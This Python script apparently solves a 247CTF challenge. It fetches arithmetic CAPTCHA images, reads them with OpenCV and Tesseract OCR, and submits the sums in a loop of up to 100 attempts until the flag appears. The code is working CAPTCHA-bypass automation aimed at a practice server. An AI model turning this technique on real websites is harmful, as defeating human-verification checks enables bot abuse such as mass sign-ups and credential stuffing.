#!/usr/bin/env python3
import cv2
import numpy as np
import pytesseract
import requests
import re
import time

BASE_URL = "https://087ba594e710a16e.247ctf.com/"

def solve_fast(session):
    """Resuelve un CAPTCHA rápidamente"""
    try:
        # GET / para inicializar
        session.get(BASE_URL)
        
        # GET mturk.php
        img_response = session.get(BASE_URL + "mturk.php")
        nparr = np.frombuffer(img_response.content, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        
        # Preprocesar (threshold 130 inverso x10)
        _, thresh = cv2.threshold(img, 130, 255, cv2.THRESH_BINARY_INV)
        mega = cv2.resize(thresh, (img.shape[1]*10, img.shape[0]*10), interpolation=cv2.INTER_CUBIC)
        
        # OCR con Tesseract
        text = pytesseract.image_to_string(mega, config='--psm 7').strip()
        
        # Limpiar
        cleaned = re.sub(r'[^0-9+]', '', text)
        
        # Buscar patrón A+B
        match = re.search(r'(\d+)\+(\d+)', cleaned)
        if match:
            a = int(match.group(1))
            b = int(match.group(2))
            answer = a + b
            
            # Enviar
            data = {"captcha": str(answer)}
            response = session.post(BASE_URL, data=data)
            
            return True, answer, response.text
        
        # Si no hay +, probar división en mitad
        numbers = re.findall(r'\d+', cleaned)
        if len(numbers) >= 2:
            a = int(numbers[0])
            b = int(numbers[1])
            answer = a + b
            
            data = {"captcha": str(answer)}
            response = session.post(BASE_URL, data=data)
            
            return True, answer, response.text
        
        return False, None, f"No match: '{cleaned}'"
    except Exception as e:
        return False, None, str(e)

# Resolver
session = requests.Session()
start = time.time()
solved = 0

print("Resolviendo CAPTCHAs...\n")

for i in range(100):
    success, answer, response_text = solve_fast(session)
    
    if success:
        if "invalid" not in response_text.lower():
            solved += 1
            
            if "flag" in response_text.lower() or "247ctf{" in response_text.lower():
                print(f"\n{'='*60}")
                flag_match = re.search(r'247CTF\{[^}]+\}', response_text, re.IGNORECASE)
                if flag_match:
                    print(flag_match.group(0))
                    print(f"{'='*60}")
                break
            
            if solved % 10 == 0:
                print(f"{solved}/100 en {time.time()-start:.1f}s")
        
        elif "timeout" in response_text.lower() or "slow" in response_text.lower():
            print(f"\nTimeout en {i+1}")
            break

elapsed = time.time() - start
print(f"\nTotal: {solved}/100 en {elapsed:.1f}s")
